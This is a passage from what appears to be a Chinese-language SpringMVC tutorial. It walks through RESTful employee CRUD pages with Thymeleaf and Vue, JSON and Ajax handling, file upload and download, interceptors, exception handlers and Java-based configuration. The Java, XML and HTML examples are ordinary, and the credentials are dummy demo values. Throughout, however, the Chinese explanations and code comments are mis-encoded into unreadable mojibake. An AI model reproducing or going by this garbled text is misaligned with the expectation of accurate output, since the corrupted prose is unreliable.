center;" id="dataTable">\n        <tr>\n            <th colspan="5">Employee Info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastName</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options(<a th:href="@{/toAdd}">add</a>)</th>\n        </tr>\n        <tr th:each="employee : ${employeeList}">\n            <td th:text="${employee.id}"></td>\n            <td th:text="${employee.lastName}"></td>\n            <td th:text="${employee.email}"></td>\n            <td th:text="${employee.gender}"></td>\n            <td>\n                <a class="deleteA" @click="deleteEmployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n                <a th:href="@{\'/employee/\'+${employee.id}}">update</a>\n            </td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 2. åå»ºControllerå¤çè¯·æ±æ¹æ³\n\npackage com.pwddd.emp.controller;  \n  \nimport com.pwddd.emp.dao.EmployeeDao;  \nimport com.pwddd.emp.entity.Employee;  \nimport org.springframework.beans.factory.annotation.Autowired;  \nimport org.springframework.stereotype.Controller;  \nimport org.springframework.ui.Model;  \nimport org.springframework.web.bind.annotation.RequestMapping;  \nimport org.springframework.web.bind.annotation.RequestMethod;  \n  \nimport java.util.Collection;  \n  \n@Controller  \npublic class EmployeeController {  \n  \n @Autowired  \n private EmployeeDao employeeDao;  \n  \n @RequestMapping(value = "/employee", method = RequestMethod.GET)  \n public String getEmployeeList(Model model){  \n Collection<Employee> employeeList = employeeDao.getAll();  \n model.addAttribute("employeeList", employeeList);  \n return "employee_list";  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# å é¤åè½\n\nå é¤åè½ç¨å¾®éº»ç¦ï¼ä¸è½ä½¿ç¨formè¡¨åè¿è¡æä½ï¼ä½æ¯éè¦è®¾ç½®ä¸ä¸ªéèç_methodå±æ§ï¼å æ­¤å¯ä»¥ä½¿ç¨VUEçå°aæ ç­¾è§¦åç»å®å°ä¸ä¸ªformè¡¨åæäº¤ä¹ä¸ï¼ç¶åå¨è¡¨åéé¢æ·»å å±æ§ã\n\n 1. åå»ºå¤çdeleteè¯·æ±æ¹å¼çè¡¨å\n\n\x3c!-- ä½ç¨ï¼éè¿è¶é¾æ¥æ§å¶è¡¨åçæäº¤ï¼å°postè¯·æ±è½¬æ¢ä¸ºdeleteè¯·æ± --\x3e\n<form id="delete_form" method="post">\n    \x3c!-- HiddenHttpMethodFilterè¦æ±ï¼å¿é¡»ä¼ è¾_methodè¯·æ±åæ°ï¼å¹¶ä¸å¼ä¸ºæç»çè¯·æ±æ¹å¼ --\x3e\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n\n\n1\n2\n3\n4\n5\n6\n\n 2. å é¤è¶é¾æ¥ç»å®ç¹å»äºä»¶\n\n\x3c!--å¼å¥vue--\x3e\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n\n\x3c!--ç»å®è¡¨å--\x3e\n<a class="deleteA" @click="deleteEmployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n\n\x3c!--éè¿vueå¤çç¹å»äºä»¶--\x3e\n<script type="text/javascript">\n    var vue = new Vue({\n        el:"#dataTable",\n        methods:{\n            //eventè¡¨ç¤ºå½åäºä»¶\n            deleteEmployee:function (event) {\n                //éè¿idè·åè¡¨åæ ç­¾\n                var delete_form = document.getElementById("delete_form");\n                //å°è§¦åäºä»¶çè¶é¾æ¥çhrefå±æ§ä¸ºè¡¨åçactionå±æ§èµå¼\n                delete_form.action = event.target.href;\n                //æäº¤è¡¨å\n                delete_form.submit();\n                //é»æ­¢è¶é¾æ¥çé»è®¤è·³è½¬è¡ä¸º\n                event.preventDefault();\n            }\n        }\n    });\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. åå»ºæå¡ç«¯çæ¹æ³\n\n@RequestMapping(value = "/employee/{id}", method = RequestMethod.DELETE)\npublic String deleteEmployee(@PathVariable("id") Integer id){\n    employeeDao.delete(id);\n    return "redirect:/employee";\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n 4. Spring-mvc.xmléç½®æä»¶å¼å¯éæèµæºçé»è®¤servletå¤ç\n\n<mvc:default-servlet-handler default-servlet-name="default" />\n\n\n1\n\n\nå¨é»è®¤æåµä¸ï¼å­å¨ä¸ä¸ªdefalutservletå¤çæä»¬çè¯·æ±ï¼ä½æ¯æä»¬å¨web.xmlä¸­éç½®çDispatchServletçurl-parttenåé»è®¤çä¸æ ·ï¼æä»¥è¿è¡äºè¦çï¼ä¹å°±æ¯å®¢æ·ç«¯çææè¯·æ±é½ä¼æ¾å°dispatchServletè¿è¡å¤çï¼åæ¬éæèµæºï¼ä½æ¯DispatchServletä¸ç¥ééæèµæºå¨åªãå¼å¯é»è®¤çserlvetå¤çéæèµæºï¼å½dispatchServletæ¾ä¸å°è¯·æ±çåå®¹æ¶ï¼äº¤ç»é»è®¤Servletå¤çï¼é»è®¤çServletæ¾ä¸å°ï¼å404æ¥éã\n\n# æ°æ®æ°å¢\n\n 1. éç½®view-controller\n\n<mvc:view-controller path="/toAdd" view-name="employee_add"></mvc:view-controller>\n\n\n1\n\n 2. åå»ºé¡µé¢\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Add Employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    lastName:<input type="text" name="lastName"><br>\n    email:<input type="text" name="email"><br>\n    gender:<input type="radio" name="gender" value="1">male\n    <input type="radio" name="gender" value="0">female<br>\n    <input type="submit" value="add"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 3. æ°å¢æå¡ç«¯æ¹æ³\n\n@RequestMapping(value = "/employee", method = RequestMethod.POST)\npublic String addEmployee(Employee employee){\n    employeeDao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# æ°æ®ä¿®æ¹\n\n 1. åå»ºæ°æ®ä¿®æ¹é¡µé¢\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Update Employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    <input type="hidden" name="_method" value="put">\n    <input type="hidden" name="id" th:value="${employee.id}">\n    lastName:<input type="text" name="lastName" th:value="${employee.lastName}"><br>\n    email:<input type="text" name="email" th:value="${employee.email}"><br>\n    \x3c!--\n        th:field="${employee.gender}"å¯ç¨äºåéæ¡æå¤éæ¡çåæ¾\n        è¥åéæ¡çvalueåemployee.genderçå¼ä¸è´ï¼åæ·»å checked="checked"å±æ§\n    --\x3e\n    gender:<input type="radio" name="gender" value="1" th:field="${employee.gender}">male\n    <input type="radio" name="gender" value="0" th:field="${employee.gender}">female<br>\n    <input type="submit" value="update"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. æå¡ç«¯éç½®æ°æ®ä¿®æ¹é¡µé¢åæ¾åè·³è½¬é¾æ¥\n\n@RequestMapping(value = "/employee/{id}", method = RequestMethod.GET)\npublic String getEmployeeById(@PathVariable("id") Integer id, Model model){\n    Employee employee = employeeDao.get(id);\n    model.addAttribute("employee", employee);\n    return "employee_update";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. æå¡ç«¯éç½®ä¿®æ¹æä½æ¹æ³\n\n@RequestMapping(value = "/employee", method = RequestMethod.PUT)\npublic String updateEmployee(Employee employee){\n    employeeDao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# HttpMessageConverter\n\nHttpMessageConverterï¼æ¥æä¿¡æ¯è½¬æ¢å¨ï¼å°è¯·æ±æ¥æè½¬æ¢ä¸ºJavaå¯¹è±¡ï¼æå°Javaå¯¹è±¡è½¬æ¢ä¸ºååºæ¥æã HttpMessageConverteræä¾äºä¸¤ä¸ªæ³¨è§£åä¸¤ä¸ªç±»åï¼\n\n * @RequestBody\n * @ResponseBody\n * RequestEntity\n * ResponseEntity\n\n\n# @RequestBody\n\n@RequestBodyå¯ä»¥è·åè¯·æ±ä½ï¼éè¦å¨æ§å¶å¨æ¹æ³è®¾ç½®ä¸ä¸ªå½¢åï¼ä½¿ç¨@RequestBodyè¿è¡æ è¯ï¼å½åè¯·æ±çè¯·æ±ä½å°±ä¼ä¸ºå½åæ³¨è§£ææ è¯çå½¢åèµå¼\n\n<form th:action="@{/testRequestBody}" method="post">\n    ç¨æ·åï¼<input type="text" name="username"><br>\n    å¯ç ï¼<input type="password" name="password"><br>\n    <input type="submit">\n</form>\n\n\n1\n2\n3\n4\n5\n\n\n@RequestMapping("/testRequestBody")\npublic String testRequestBody(@RequestBody String requestBody){\n    System.out.println("requestBody:"+requestBody);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\nrequestBody:username=admin&amp;password=123456\n\n\n1\n\n\n\n# RequestEntity\n\nRequestEntityå°è£è¯·æ±æ¥æçä¸ç§ç±»åï¼éè¦å¨æ§å¶å¨æ¹æ³çå½¢åä¸­è®¾ç½®è¯¥ç±»åçå½¢åï¼å½åè¯·æ±çè¯·æ±æ¥æå°±ä¼èµå¼ç»è¯¥å½¢åï¼å¯ä»¥éè¿getHeaders()è·åè¯·æ±å¤´ä¿¡æ¯ï¼éè¿getBody()è·åè¯·æ±ä½ä¿¡æ¯\n\n@RequestMapping("/testRequestEntity")\npublic String testRequestEntity(RequestEntity<String> requestEntity){\n    System.out.println("requestHeader:"+requestEntity.getHeaders());\n    System.out.println("requestBody:"+requestEntity.getBody());\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¾åºç»æï¼ requestHeader:[host:"localhost:8080", connection:"keep-alive", content-length:"27", cache-control:"max-age=0", sec-ch-ua:"" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"", sec-ch-ua-mobile:"?0", upgrade-insecure-requests:"1", origin:"[http://localhost:8080"](http://localhost:8080"), user-agent:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"] requestBody:username=admin&amp;password=123\n\n\n1\n\n\n\n# @ResponseBody\n\n@ResponseBodyç¨äºæ è¯ä¸ä¸ªæ§å¶å¨æ¹æ³ï¼å¯ä»¥å°è¯¥æ¹æ³çè¿åå¼ç´æ¥ä½ä¸ºååºæ¥æçååºä½ååºå°æµè§å¨ã\n\n@RequestMapping("/testResponseBody")\n@ResponseBody\npublic String testResponseBody(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# SpringMVCå¤çjson\n\n 1. å¯¼å¥Jackjsonä¾èµ\n\n<dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.12.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. å¨SpringMVCçæ ¸å¿éç½®æä»¶ä¸­å¼å¯mvcçæ³¨è§£é©±å¨ï¼æ­¤æ¶å¨HandlerAdaptorä¸­ä¼èªå¨è£éä¸ä¸ªæ¶æ¯è½¬æ¢å¨ï¼MappingJackson2HttpMessageConverterï¼å¯ä»¥å°ååºå°æµè§å¨çJavaå¯¹è±¡è½¬æ¢ä¸ºJsonæ ¼å¼çå­ç¬¦ä¸²\n\n<mvc:annotation-driven />\n\n\n1\n\n\n 3. å¨å¤çå¨æ¹æ³ä¸ä½¿ç¨@ResponseBodyæ³¨è§£è¿è¡æ è¯\n\n 4. å°Javaå¯¹è±¡ç´æ¥ä½ä¸ºæ§å¶å¨æ¹æ³çè¿åå¼è¿åï¼å°±ä¼èªå¨è½¬æ¢ä¸ºJsonæ ¼å¼çå­ç¬¦ä¸²\n\n@RequestMapping("/testResponseUser")\n@ResponseBody\npublic User testResponseUser(){\n    return new User(1001,"admin","123456",23,"ç·");\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# SpringMVCå¤çajax\n\n 1. è¯·æ±å°åè¶é¾æ¥\n\n<div id="app">\n    <a th:href="@{/testAjax}" @click="testAjax">testAjax</a><br>\n</div>\n\n\n1\n2\n3\n\n 2. éè¿vueåaxioså¤çç¹å»äºä»¶\n\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n<script type="text/javascript" th:src="@{/static/js/axios.min.js}"><\/script>\n<script type="text/javascript">\n    var vue = new Vue({\n        el:"#app",\n        methods:{\n            testAjax:function (event) {\n                axios({\n                    method:"post",\n                    url:event.target.href,\n                    params:{\n                        username:"admin",\n                        password:"123456"\n                    }\n                }).then(function (response) {\n                    alert(response.data);\n                });\n                event.preventDefault();\n            }\n        }\n    });\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 3. ç¼åæ§å¶å¨æ¹æ³\n\n@RequestMapping("/testAjax")\n@ResponseBody\npublic String testAjax(String username, String password){\n    System.out.println("username:"+username+",password:"+password);\n    return "hello,ajax";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @RestControlleræ³¨è§£\n\n@RestControlleræ³¨è§£æ¯springMVCæä¾çä¸ä¸ªå¤åæ³¨è§£ï¼æ è¯å¨æ§å¶å¨çç±»ä¸ï¼å°±ç¸å½äºä¸ºç±»æ·»å äº@Controlleræ³¨è§£ï¼å¹¶ä¸ä¸ºå¶ä¸­çæ¯ä¸ªæ¹æ³æ·»å äº@ResponseBodyæ³¨è§£\n\n\n# ResponseEntity\n\nResponseEntityç¨äºæ§å¶å¨æ¹æ³çè¿åå¼ç±»åï¼è¯¥æ§å¶å¨æ¹æ³çè¿åå¼å°±æ¯ååºå°æµè§å¨çååºæ¥æã\n\n\n# æä»¶ä¸ä¼ åä¸è½½\n\n\n# æä»¶ä¸è½½åè½\n\n@RequestMapping("/testDown")\npublic ResponseEntity<byte[]> testResponseEntity(HttpSession session) throws IOException {\n    //è·åServletContextå¯¹è±¡\n    ServletContext servletContext = session.getServletContext();\n    //è·åæå¡å¨ä¸­æä»¶ççå®è·¯å¾\n    String realPath = servletContext.getRealPath("/static/img/1.jpg");\n    //åå»ºè¾å¥æµ\n    InputStream is = new FileInputStream(realPath);\n    //åå»ºå­èæ°ç»\n    byte[] bytes = new byte[is.available()];\n    //å°æµè¯»å°å­èæ°ç»ä¸­\n    is.read(bytes);\n    //åå»ºHttpHeaderså¯¹è±¡è®¾ç½®ååºå¤´ä¿¡æ¯\n    MultiValueMap<String, String> headers = new HttpHeaders();\n    //è®¾ç½®è¦ä¸è½½æ¹å¼ä»¥åä¸è½½æä»¶çåå­\n    headers.add("Content-Disposition", "attachment;filename=1.jpg");\n    //è®¾ç½®ååºç¶æç \n    HttpStatus statusCode = HttpStatus.OK;\n    //åå»ºResponseEntityå¯¹è±¡\n    ResponseEntity<byte[]> responseEntity = new ResponseEntity<>(bytes, headers, statusCode);\n    //å³é­è¾å¥æµ\n    is.close();\n    return responseEntity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# æä»¶ä¸ä¼ åè½\n\næä»¶ä¸ä¼ è¦æ±formè¡¨åçè¯·æ±æ¹å¼å¿é¡»ä¸ºpostï¼å¹¶ä¸æ·»å å±æ§enctype="multipart/form-data" SpringMVCä¸­å°ä¸ä¼ çæä»¶å°è£å°MultipartFileå¯¹è±¡ä¸­ï¼éè¿æ­¤å¯¹è±¡å¯ä»¥è·åæä»¶ç¸å³ä¿¡æ¯\n\nä¸ä¼ æ­¥éª¤ï¼\n\n 1. æ·»å ä¾èµ\n\n\x3c!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\x3e\n<dependency>\n    <groupId>commons-fileupload</groupId>\n    <artifactId>commons-fileupload</artifactId>\n    <version>1.3.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n 2. å¨SpringMVCçéç½®æä»¶ä¸­æ·»å éç½®\n\n\x3c!--å¿é¡»éè¿æä»¶è§£æå¨çè§£ææè½å°æä»¶è½¬æ¢ä¸ºMultipartFileå¯¹è±¡--\x3e\n<bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver"></bean>\n\n\n1\n2\n\n 3. éç½®æ§å¶å¨æ¹æ³\n\n@RequestMapping("/testUp")\npublic String testUp(MultipartFile photo, HttpSession session) throws IOException {\n    //è·åä¸ä¼ çæä»¶çæä»¶å\n    String fileName = photo.getOriginalFilename();\n    //å¤çæä»¶éåé®é¢\n    String hzName = fileName.substring(fileName.lastIndexOf("."));\n    fileName = UUID.randomUUID().toString() + hzName;\n    //è·åæå¡å¨ä¸­photoç®å½çè·¯å¾\n    ServletContext servletContext = session.getServletContext();\n    String photoPath = servletContext.getRealPath("photo");\n    File file = new File(photoPath);\n    if(!file.exists()){\n        file.mkdir();\n    }\n    String finalPath = photoPath + File.separator + fileName;\n    //å®ç°ä¸ä¼ åè½\n    photo.transferTo(new File(finalPath));\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# æ¦æªå¨\n\n\n# æ¦æªå¨çéç½®\n\nSpringMVCä¸­çæ¦æªå¨ç¨äºæ¦æªæ§å¶å¨æ¹æ³çæ§è¡ SpringMVCä¸­çæ¦æªå¨éè¦å®ç°HandlerInterceptor SpringMVCçæ¦æªå¨å¿é¡»å¨SpringMVCçéç½®æä»¶ä¸­è¿è¡éç½®ï¼\n\n<bean class="com.atguigu.interceptor.FirstInterceptor"></bean>\n<ref bean="firstInterceptor"></ref>\n\x3c!-- ä»¥ä¸ä¸¤ç§éç½®æ¹å¼é½æ¯å¯¹DispatcherServletæå¤ççææçè¯·æ±è¿è¡æ¦æª --\x3e\n<mvc:interceptor>\n    <mvc:mapping path="/**"/>\n    <mvc:exclude-mapping path="/testRequestEntity"/>\n    <ref bean="firstInterceptor"></ref>\n</mvc:interceptor>\n\x3c!-- \n    ä»¥ä¸éç½®æ¹å¼å¯ä»¥éè¿refæbeanæ ç­¾è®¾ç½®æ¦æªå¨ï¼éè¿mvc:mappingè®¾ç½®éè¦æ¦æªçè¯·æ±ï¼éè¿mvc:exclude-mappingè®¾ç½®éè¦æé¤çè¯·æ±ï¼å³ä¸éè¦æ¦æªçè¯·æ±\n--\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# æ¦æªå¨çä¸ä¸ªå¤çæ¹æ³\n\nSpringMVCä¸­çæ¦æªå¨æä¸ä¸ªæ½è±¡æ¹æ³ï¼ preHandleï¼æ§å¶å¨æ¹æ³æ§è¡ä¹åæ§è¡preHandle()ï¼å¶booleanç±»åçè¿åå¼è¡¨ç¤ºæ¯å¦æ¦æªææ¾è¡ï¼è¿åtrueä¸ºæ¾è¡ï¼å³è°ç¨æ§å¶å¨æ¹æ³ï¼è¿åfalseè¡¨ç¤ºæ¦æªï¼å³ä¸è°ç¨æ§å¶å¨æ¹æ³ postHandleï¼æ§å¶å¨æ¹æ³æ§è¡ä¹åæ§è¡postHandle() afterComplationï¼å¤çå®è§å¾åæ¨¡åæ°æ®ï¼æ¸²æè§å¾å®æ¯ä¹åæ§è¡afterComplation()\n\n\n# å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåº\n\n * è¥æ¯ä¸ªæ¦æªå¨çpreHandle()é½è¿åtrue\n   * æ­¤æ¶å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåºåæ¦æªå¨å¨SpringMVCçéç½®æä»¶çéç½®é¡ºåºæå³\n   * preHandle()ä¼æç§éç½®çé¡ºåºæ§è¡ï¼èpostHandle()åafterComplation()ä¼æç§éç½®çååºæ§è¡\n * è¥æä¸ªæ¦æªå¨çpreHandle()è¿åäºfalse\n   * preHandle()è¿åfalseåå®ä¹åçæ¦æªå¨çpreHandle()é½ä¼æ§è¡ï¼postHandle()é½ä¸æ§è¡ï¼è¿åfalseçæ¦æªå¨ä¹åçæ¦æªå¨çafterComplation()ä¼æ§è¡\n\n\n# å¼å¸¸å¤çå¨\n\n\n# åºäºéç½®çå¼å¸¸å¤ç\n\nSpringMVCæä¾äºä¸ä¸ªå¤çæ§å¶å¨æ¹æ³æ§è¡è¿ç¨ä¸­æåºç°çå¼å¸¸çæ¥å£ï¼HandlerExceptionResolver HandlerExceptionResolveræ¥å£çå®ç°ç±»æï¼DefaultHandlerExceptionResolveråSimpleMappingExceptionResolver SpringMVCæä¾äºèªå®ä¹çå¼å¸¸å¤çå¨SimpleMappingExceptionResolverã\n\n<bean class="org.springframework.web.servlet.handler.SimpleMappingExceptionResolver">\n    <property name="exceptionMappings">\n        <props>\n            \x3c!--\n                propertiesçé®è¡¨ç¤ºå¤çå¨æ¹æ³æ§è¡è¿ç¨ä¸­åºç°çå¼å¸¸\n                propertiesçå¼è¡¨ç¤ºè¥åºç°æå®å¼å¸¸æ¶ï¼è®¾ç½®ä¸ä¸ªæ°çè§å¾åç§°ï¼è·³è½¬å°æå®é¡µé¢\n            --\x3e\n            <prop key="java.lang.ArithmeticException">error</prop>\n        </props>\n    </property>\n    \x3c!--\n        exceptionAttributeå±æ§è®¾ç½®ä¸ä¸ªå±æ§åï¼å°åºç°çå¼å¸¸ä¿¡æ¯å¨è¯·æ±åä¸­è¿è¡å±äº«\n    --\x3e\n    <property name="exceptionAttribute" value="ex"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# åºäºæ³¨è§£çå¼å¸¸å¤ç\n\n//@ControllerAdviceå°å½åç±»æ è¯ä¸ºå¼å¸¸å¤ççç»ä»¶\n@ControllerAdvice\npublic class ExceptionController {\n\n    //@ExceptionHandlerç¨äºè®¾ç½®ææ è¯æ¹æ³å¤ççå¼å¸¸\n    @ExceptionHandler(ArithmeticException.class)\n    //exè¡¨ç¤ºå½åè¯·æ±å¤çä¸­åºç°çå¼å¸¸å¯¹è±¡\n    public String handleArithmeticException(Exception ex, Model model){\n        model.addAttribute("ex", ex);\n        return "error";\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# æ³¨è§£éç½®SpringMVC\n\n> ä½¿ç¨éç½®ç±»åæ³¨è§£ä»£æ¿web.xmlåSpringMVCéç½®æä»¶çåè½\n\n 1. åå»ºåå§åç±»ï¼ä»£æ¿web.xml\n\nå¨Servlet3.0ç¯å¢ä¸­ï¼å®¹å¨ä¼å¨ç±»è·¯å¾ä¸­æ¥æ¾å®ç°javax.servlet.ServletContainerInitializeræ¥å£çç±»ï¼å¦ææ¾å°çè¯å°±ç¨å®æ¥éç½®Servletå®¹å¨ã Springæä¾äºè¿ä¸ªæ¥å£çå®ç°ï¼åä¸ºSpringServletContainerInitializerï¼è¿ä¸ªç±»åè¿æ¥åä¼æ¥æ¾å®ç°WebApplicationInitializerçç±»å¹¶å°éç½®çä»»å¡äº¤ç»å®ä»¬æ¥å®æãSpring3.2å¼å¥äºä¸ä¸ªä¾¿å©çWebApplicationInitializeråºç¡å®ç°ï¼åä¸ºAbstractAnnotationConfigDispatcherServletInitializerï¼å½æä»¬çç±»æ©å±äºAbstractAnnotationConfigDispatcherServletInitializerå¹¶å°å¶é¨ç½²å°Servlet3.0å®¹å¨çæ¶åï¼å®¹å¨ä¼èªå¨åç°å®ï¼å¹¶ç¨å®æ¥éç½®Servletä¸ä¸æã\n\npublic class WebInit extends AbstractAnnotationConfigDispatcherServletInitializer {\n\n    /**\n     * æå®springçéç½®ç±»\n     * @return\n     */\n    @Override\n    protected Class<?>[] getRootConfigClasses() {\n        return new Class[]{SpringConfig.class};\n    }\n\n    /**\n     * æå®SpringMVCçéç½®ç±»\n     * @return\n     */\n    @Override\n    protected Class<?>[] getServletConfigClasses() {\n        return new Class[]{WebConfig.class};\n    }\n\n    /**\n     * æå®DispatcherServletçæ å°è§åï¼å³url-pattern\n     * @return\n     */\n    @Override\n    protected String[] getServletMappings() {\n        return new String[]{"/"};\n    }\n\n    /**\n     * æ·»å è¿æ»¤å¨\n     * @return\n     */\n    @Override\n    protected Filter[] getServletFilters() {\n        CharacterEncodingFilter encodingFilter = new CharacterEncodingFilter();\n        encodingFilter.setEncoding("UTF-8");\n        encodingFilter.setForceRequestEncoding(true);\n        HiddenHttpMethodFilter hiddenHttpMethodFilter = new HiddenHttpMethodFilter();\n        return new Filter[]{encodingFilter, hiddenHttpMethodFilter};\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n 2. åå»ºSpringConfigéç½®ç±»ï¼ä»£æ¿springçéç½®æä»¶\n\n@Configuration\npublic class SpringConfig {\n    //ssmæ´åä¹åï¼springçéç½®ä¿¡æ¯åå¨æ­¤ç±»ä¸­\n}\n\n\n1\n2\n3\n4\n\n 3. åå»ºWebConfigéç½®ç±»ï¼ä»£æ¿SpringMVCçéç½®æä»¶\n\n@Configuration\n//æ«æç»ä»¶\n@ComponentScan("com.atguigu.mvc.controller")\n//å¼å¯MVCæ³¨è§£é©±å¨\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    //ä½¿ç¨é»è®¤çservletå¤çéæèµæº\n    @Override\n    public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {\n        configurer.enable();\n    }\n\n    //éç½®æä»¶ä¸ä¼ è§£æå¨\n    @Bean\n    public CommonsMultipartResolver multipartResolver(){\n        return new CommonsMultipartResolver();\n    }\n\n    //éç½®æ¦æªå¨\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        FirstInterceptor firstInterceptor = new FirstInterceptor();\n        registry.addInterceptor(firstInterceptor).addPathPatterns("/**");\n    }\n\n    //éç½®è§å¾æ§å¶\n\n    /*@Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController("/").setViewName("index");\n    }*/\n\n    //éç½®å¼å¸¸æ å°\n    /*@Override\n    public void configureHandlerExceptionResolvers(List<HandlerExceptionResolver> resolvers) {\n        SimpleMappingExceptionResolver exceptionResolver = new SimpleMappingExceptionResolver();\n        Properties prop = new Properties();\n        prop.setProperty("java.lang.ArithmeticException", "error");\n        //è®¾ç½®å¼å¸¸æ å°\n        exceptionResolver.setExceptionMappings(prop);\n        //è®¾ç½®å±äº«å¼å¸¸ä¿¡æ¯çé®\n        exceptionResolver.setExceptionAttribute("ex");\n        resolvers.add(exceptionResolver);\n    }*/\n\n    //éç½®çææ¨¡æ¿è§£æå¨\n    @Bean\n    public ITemplateResolver templateResolver() {\n        WebApplicationContext webApplicationContext = ContextLoader.getCurrentWebApplicationContext();\n        // ServletContextTemplateResolveréè¦ä¸ä¸ªServletContextä½ä¸ºæé åæ°ï¼å¯éè¿WebApplicationContext çæ¹æ³è·å¾\n        ServletContextTemplateResolver templateResolver = new ServletContextTemplateResolver(\n                webApplicationContext.getServletContext());\n        templateResolver.setPrefix("/WEB-INF/templates/");\n        templateResolver.setSuffix(".html");\n        templateResolver.setCharacterEncoding("UTF-8");\n        templateResolver.setTemplateMode(TemplateMode.HTML);\n        return templateResolver;\n    }\n\n    //çææ¨¡æ¿å¼æå¹¶ä¸ºæ¨¡æ¿å¼ææ³¨å¥æ¨¡æ¿è§£æå¨\n    @Bean\n    public SpringTemplateEngine templateEngine(ITemplateResolver templateResolver) {\n        SpringTemplateEngine templateEngine = new SpringTemplateEngine();\n        templateEngine.setTemplateResolver(templateResolver);\n        return templateEngine;\n    }\n\n    //çæè§å¾è§£æå¨å¹¶æªè§£æå¨æ³¨å¥æ¨¡æ¿å¼æ\n    @Bean\n    public ViewResolver viewResolver(SpringTemplateEngine templateEngine) {\n        ThymeleafViewResolver viewResolver = new ThymeleafViewResolver();\n        viewResolver.setCharacterEncoding("UTF-8");\n        viewResolver.setTemplateEngine(templateEngine);\n        return viewResolver;\n    }\n\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n\n# SpringMVCæ§è¡æµç¨\n\n\n# SpringMVCå¸¸ç¨ç»ä»¶\n\nDispatcherServletï¼åç«¯æ§å¶å¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼ç»ä¸å¤çè¯·æ±åååºï¼æ´ä¸ªæµç¨æ§å¶çä¸­å¿ï¼ç±å®è°ç¨å